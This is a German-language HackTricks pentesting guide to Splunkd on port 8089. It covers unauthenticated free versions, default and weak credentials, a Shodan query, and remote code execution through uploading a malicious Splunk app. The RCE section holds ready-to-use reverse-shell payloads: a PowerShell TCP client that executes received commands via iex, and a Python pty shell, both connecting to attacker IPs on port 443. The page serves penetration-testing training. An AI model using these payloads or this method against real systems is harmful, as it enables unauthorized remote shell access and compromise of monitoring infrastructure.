# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Grundinformationen**

* Log-Analyse-Tool, das f√ºr Datensammlung, Analyse und Visualisierung verwendet wird
* H√§ufig in der Sicherheits√ºberwachung und Gesch√§ftsanalyse eingesetzt
* Standardports:
* Webserver: 8000
* Splunkd-Dienst: 8089

### Schwachstellenvektoren:

1. Ausnutzung der kostenlosen Version

* Testversion wird nach 60 Tagen automatisch in die kostenlose Version umgewandelt
* Kostenlose Version hat keine Authentifizierung
* Potenzielles Sicherheitsrisiko, wenn sie nicht verwaltet wird
* Administratoren k√∂nnten die Sicherheitsimplikationen √ºbersehen

2. Schw√§chen bei Anmeldeinformationen

* √Ñltere Versionen: Standardanmeldeinformationen `admin:changeme`
* Neuere Versionen: Anmeldeinformationen werden w√§hrend der Installation festgelegt
* Potenzial f√ºr die Verwendung schwacher Passw√∂rter (z. B. `admin`, `Welcome`, `Password123`)

3. M√∂glichkeiten zur Remote-Code-Ausf√ºhrung

* Mehrere Methoden zur Codeausf√ºhrung:
* Serverseitige Django-Anwendungen
* REST-Endpunkte
* Skriptbasierte Eingaben
* Alarmierungsskripte
* Plattform√ºbergreifende Unterst√ºtzung (Windows/Linux)
* Skriptbasierte Eingaben k√∂nnen ausf√ºhren:
* Bash-Skripte
* PowerShell-Skripte
* Batch-Skripte

Wichtiges Ausnutzungspotenzial:

* Speicherung sensibler Daten
* Fehlende Authentifizierung in der kostenlosen Version
* Mehrere Vektoren f√ºr potenzielle Remote-Code-Ausf√ºhrung
* M√∂glichkeit, skriptbasierte Eingaben f√ºr Systemkompromittierung zu nutzen

### Shodan

* `Splunk build`

## RCE

### Erstellen einer benutzerdefinierten Anwendung

Splunk bietet eine ausgekl√ºgelte Methode zur Remote-Code-Ausf√ºhrung durch die Bereitstellung benutzerdefinierter Anwendungen, die seine plattform√ºbergreifenden Skriptingf√§higkeiten nutzen. Die grundlegende Ausnutzungstechnik dreht sich um die Erstellung einer b√∂sartigen Anwendung, die Reverse-Shells auf sowohl Windows- als auch Linux-Systemen ausf√ºhren kann.

Eine benutzerdefinierte Anwendung kann **Python, Batch, Bash oder PowerShell-Skripte** ausf√ºhren. Dar√ºber hinaus **kommt Splunk mit installiertem Python**, sodass Sie sogar auf **Windows**-Systemen Python-Code ausf√ºhren k√∂nnen.

Sie k√∂nnen [**dieses**](https://github.com/0xjpuff/reverse_shell_splunk) Beispiel mit dem **`bin`** verwenden, das Beispiele f√ºr [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) und [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1) enth√§lt. Oder Sie k√∂nnten Ihre eigene erstellen.

Der Ausnutzungsprozess folgt einer konsistenten Methodik √ºber Plattformen hinweg:
```
splunk_shell/
‚îú‚îÄ‚îÄ bin        (reverse shell scripts)
‚îî‚îÄ‚îÄ default    (inputs.conf configuration)
```
Die kritische Konfigurationsdatei `inputs.conf` aktiviert das Skript durch:

* Festlegen von `disabled = 0`
* Konfigurieren eines 10-Sekunden-Ausf√ºhrungsintervalls
* Definieren des Quelltyps des Skripts

Die Bereitstellung ist unkompliziert:

1. Erstellen Sie das b√∂sartige Anwendungs-Paket
2. Richten Sie einen Listener (Netcat/socat) auf der angreifenden Maschine ein
3. Laden Sie die Anwendung √ºber die Schnittstelle von Splunk hoch
4. Ausl√∂sen der automatischen Skriptausf√ºhrung nach dem Hochladen

Beispiel f√ºr eine Windows PowerShell Reverse Shell:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()
```
Beispiel f√ºr eine Linux Python Reverse Shell:
```python
import sys, socket, os, pty
ip = "10.10.14.15"
port = "443"
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```
### RCE & Privilegieneskalation

Auf der folgenden Seite finden Sie eine Erkl√§rung, wie dieser Dienst missbraucht werden kann, um Privilegien zu eskalieren und Persistenz zu erlangen:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Referenzen

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
